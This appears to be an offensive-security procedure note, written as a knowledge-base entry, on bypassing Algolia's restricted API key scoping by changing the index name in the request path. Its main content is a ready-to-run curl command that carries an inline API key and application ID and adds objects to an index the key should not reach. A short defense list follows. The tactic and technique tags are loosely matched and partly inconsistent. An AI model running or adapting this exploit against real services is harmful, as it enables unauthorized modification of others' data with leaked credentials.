---
tags:
  - algolia
  - api-key
  - bypass
  - authorization
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/Browser-Console]]'
tactics:
  - '[[Lateral Movement]]'
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/curl-add-object-to-unauthorized-index]]'
verified: false
platforms:
  - Web
  - Cloud
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Cloud Instance Metadata API]]'
updated_at: '2025-12-14T17:32:10.450Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 1aa6e30d-6261-4ea8-9e20-e38733ec830a
validated: true
mitre_tactics:
  - '[[Lateral Movement]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Cloud Instance Metadata API]]'
---
# Bypass-API-Key-Restrictions-by-Modifying-Index-Name

## Summary

This procedure exploits the vulnerability by changing the index name in the API request path while using the same restricted key, allowing unauthorized addObject operations on other indices like 'algolia' or 'sdfdsf'.

## Description

Algolia's API does not properly enforce index scoping for restricted keys passed in query parameters or headers. By altering the /1/indexes/{index}/batch path, the key can modify data across the application, affecting data integrity for limited users.

## Requirements

1. Working restricted API key from prior steps
2. List of target indices (e.g., 'algolia', '123', 'sdfdsf')
3. curl or browser console for requests

## Defense

Defensive measures and detection strategies:

- Implement server-side validation of key scope against requested index
- Audit API logs for cross-index access with restricted keys
- Rotate keys and revoke on anomaly detection

## Objectives

1. Demonstrate scope bypass on unauthorized indices
2. Add objects to confirm unauthorized access
3. Highlight impact on data modification

## Instructions

### Step 1: Identify Target Indices

**Context**: Select unauthorized indices within the same application.

No command; use dashboard or prior knowledge to list indices like 'algolia'.

> Ensure indices exist and are not intended for the key's scope.

### Step 2: Modify and Send Request

**Context**: Alter the URL path to the new index and reuse the key.

**Command** ([[commands/curl-add-object-to-unauthorized-index]]):

```bash
curl "https://c1-in-2.algolianet.com/1/indexes/algolia/batch?x-algolia-api-key=0580d14b1c12e191b078f193b5e0e3ce&x-algolia-application-id=FTCHS7XZX2&x-algolia-agent=Algolia%20for%20vanilla%20JavaScript%203.7.5" -H "Origin: https://www.algolia.com" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" -H "content-type: application/x-www-form-urlencoded" -H "accept: application/json" -H "Referer: https://www.algolia.com/explorer" -H "Connection: keep-alive" --data "{\"requests\":[{\"action\":\"addObject\",\"body\":{\"firstname\":\"Jimmie\",\"lastname\":\"Barninger\",\"zip_code\":12345}}]}" --compressed
```

> Success indicated by 200 OK; verify addition in dashboard.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]] Lateral Movement
- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Cloud Instance Metadata API]] Cloud Services

### Sub-Techniques


## Commands Used

- [[commands/curl-add-object-to-unauthorized-index]]

## Tools Used

- [[tools/curl]]
- [[tools/Browser-Console]]

## Tags

- [[algolia]]
- [[api-key]]
- [[bypass]]
- [[authorization]]
